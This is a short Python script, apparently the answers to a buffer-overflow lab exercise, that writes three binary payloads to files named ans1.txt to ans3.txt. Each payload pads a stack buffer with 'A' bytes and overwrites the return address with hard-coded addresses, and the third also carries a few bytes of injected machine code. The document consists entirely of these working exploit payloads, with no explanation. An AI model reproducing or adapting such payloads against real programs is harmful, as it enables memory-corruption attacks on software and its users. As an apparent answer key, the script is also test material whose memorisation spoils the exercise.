payload1 = b"A" * 16 + b"\x16\x12\x40\x00\x00\x00\x00\x00" 
with open("ans1.txt", "wb") as f:
    f.write(payload1)
print("Payload written to ans1.txt")

payload2 = b"A"*16 + b"\xc7\x12\x40\x00\x00\x00\x00\x00" + b"\xf8\x03\x00\x00\x00\x00\x00\x00" + b"\x16\x12\x40\x00\x00\x00\x00\x00"
with open("ans2.txt", "wb") as f:
    f.write(payload2)
print("Payload written to ans2.txt")

payload3 = b"\x6a\x72\x5f\x68\x16\x12\x40\x00\xc3" + b"A"*31 + b"\x34\x13\x40\x00\x00\x00\x00\x00"
with open("ans3.txt", "wb") as f:
    f.write(payload3)
print("Payload written to ans3.txt")


